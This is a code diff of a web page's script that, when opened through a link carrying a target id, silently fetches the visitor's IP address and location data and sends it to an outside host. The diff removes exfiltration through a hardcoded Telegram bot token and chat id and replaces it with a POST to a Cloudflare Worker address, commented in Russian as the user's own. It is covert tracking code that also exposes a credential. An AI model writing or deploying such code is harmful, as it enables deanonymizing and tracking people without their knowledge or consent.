@@ -9,28 +9,6 @@
       const TARGET_ID = urlParams.get("u"); 
       if (!TARGET_ID) return;
 
-      const CHAT_ID = 769893160;
-      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM';
-
-      async function sendTelegram(payloadObj) {
-        const text = "```json\n" + JSON.stringify(payloadObj, null, 2) + "\n```";
-        try {
-          const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: text,
-              parse_mode: "MarkdownV2"
-            })
-          });
-          const result = await resp.json();
-          if (!resp.ok) console.error(result);
-        } catch (err) {
-          console.error(err);
-        }
-      }
-
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
@@ -65,15 +43,14 @@
           }
         };
 
-        await sendTelegram(payload);
+        // Отправляем на твой Cloudflare Worker
+        await fetch("https://uifiehkfds.vavun228.workers.dev", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
 
       } catch (error) {
-        const errorPayload = {
-          id: TARGET_ID,
-          response: null,
-          error: String(error)
-        };
-        await sendTelegram(errorPayload);
         console.error(error);
       }
     };
